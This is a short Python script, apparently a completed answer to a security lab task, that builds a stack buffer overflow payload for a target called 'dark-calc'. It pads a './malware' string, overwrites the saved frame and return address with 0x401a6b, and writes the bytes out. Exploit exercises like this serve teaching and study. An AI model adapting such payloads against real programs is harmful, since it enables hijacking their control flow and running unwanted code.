#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

def p64(x):
    return struct.pack("<Q", x)

payload = b"./malware\x00"
payload += b"A" * (16 - len(payload))
payload += b"\x00" * 8
payload += p64(0x401a6b)

sys.stdout.buffer.write(payload)
